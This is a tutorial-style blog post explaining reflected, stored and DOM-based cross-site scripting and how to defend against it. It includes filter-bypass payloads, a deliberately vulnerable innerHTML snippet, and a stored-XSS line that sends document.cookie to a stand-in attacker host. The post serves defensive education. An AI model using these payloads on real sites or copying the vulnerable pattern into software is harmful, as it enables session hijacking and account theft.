# Understanding Cross-Site Scripting (XSS): A Practical Guide
*Published: June 2026 · 10 min read · Cybersecurity*

---

## Introduction

Cross-Site Scripting, better known as XSS, is one of the most frequently discovered vulnerabilities in web applications. Despite its name — which sounds quite technical — the concept is surprisingly straightforward: an attacker injects malicious scripts into content that is then served to other users. In this post, I'll break down the different types of XSS, demonstrate how each works, and explain how to defend against them.

## How XSS Works

At a high level, XSS takes advantage of a web application that includes unvalidated user input in its output. When a victim's browser renders that page, it executes the injected script as if it were part of the legitimate application.

The classic payload:
```javascript
<script>alert('XSS')</script>
```

While this just pops an alert box, it demonstrates that arbitrary JavaScript can run. A real attacker would use something far more harmful.

## The Three Types of XSS

### 1. Reflected XSS (Non-Persistent)

The malicious script is embedded in the URL and reflected back by the server in the response. It requires the victim to click on a crafted link.

**Attack flow:**
1. Attacker crafts a URL: `https://example.com/search?q=<script>stealCookies()</script>`
2. Attacker sends link to victim via email or social engineering
3. Victim clicks the link, server reflects the input in the HTML
4. Browser executes the malicious script

**Why it's dangerous:** Even though the payload is in the URL, phishing campaigns and URL shorteners make it easy to disguise malicious links.

### 2. Stored XSS (Persistent)

The payload is permanently stored on the target server (e.g., in a database) and executed every time the affected page is loaded. This is the most dangerous form.

**Common injection points:**
- Comment sections
- User profile fields (bio, username, location)
- Forum posts
- Product reviews

**Example scenario:**
A forum allows users to post messages without proper sanitisation. An attacker posts:
```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

Every user who visits that forum thread has their session cookies sent to the attacker.

### 3. DOM-Based XSS

The vulnerability exists in client-side JavaScript that processes data from an attacker-controllable source (like `location.hash` or `document.URL`) and writes it to the DOM without sanitisation.

```javascript
// Vulnerable code
const name = location.hash.slice(1); // e.g. #<img src=x onerror=alert(1)>
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

DOM XSS never touches the server — it's entirely client-side, making it harder to detect with server-side scanning.

## Real-World XSS Payloads

Beyond the classic alert box, attackers use XSS to:

| Attack | Payload Goal |
|---|---|
| Cookie theft | Steal session tokens to hijack accounts |
| Keylogging | Record keystrokes to capture passwords |
| Phishing | Inject fake login forms |
| Cryptojacking | Mine cryptocurrency in the victim's browser |
| Defacement | Alter the visual appearance of a website |
| Malware delivery | Redirect victims to exploit kits |

## Bypassing Basic Filters

Many developers implement naive filters that strip `<script>` tags but miss other vectors:

```html
<!-- When script tags are filtered -->
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onload="alert(1)">
<iframe src="javascript:alert(1)">

<!-- When quotes are filtered -->
<img src=x onerror=alert`1`>

<!-- Case variation bypass -->
<ScRiPt>alert(1)</sCrIpT>
```

This is why blocklists alone are insufficient — allowlists and proper encoding are necessary.

## Defence in Depth

### Output Encoding
The primary defence. Encode all user-supplied data before rendering it in HTML:

| Context | Encoding Needed |
|---|---|
| HTML body | HTML entity encoding (`<` → `&lt;`) |
| HTML attributes | Attribute encoding |
| JavaScript | JavaScript escaping |
| URL parameters | URL encoding |

### Content Security Policy (CSP)
A powerful browser mechanism that controls which scripts can execute on your page:

```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com; object-src 'none'
```

A properly configured CSP can significantly reduce the impact of XSS even if injection occurs.

### HTTPOnly and Secure Cookie Flags
Prevent JavaScript from accessing session cookies:

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

### Modern Frameworks Help
React, Angular, and Vue automatically escape output by default, significantly reducing XSS risk — but only when you use their APIs correctly. Dangerous methods like `innerHTML`, `dangerouslySetInnerHTML`, or `bypassSecurityTrustHtml` must be used with extreme caution.

## Hands-On Practice

The best way to learn XSS is through practice. I recommend:

- **PortSwigger Web Security Academy** — Excellent free XSS labs ranging from beginner to expert
- **DVWA (Damn Vulnerable Web App)** — Self-hosted practice environment
- **XSS Game by Google** — Gamified XSS challenges

## Conclusion

XSS is deceptively simple to understand but surprisingly nuanced to fully prevent. The variety of contexts (HTML, JavaScript, attributes, URLs) and the creativity of attackers means that a defence-in-depth approach is essential. Output encoding is your first and most important line of defence, backed up by a strong CSP and secure cookie configuration.

As you progress in your security journey, I encourage you to explore XSS through legitimate labs and bug bounty programmes. Understanding how attackers think is the best way to build more secure applications.

---

*Tags: `xss` `cross-site-scripting` `web-security` `javascript` `bug-bounty`*
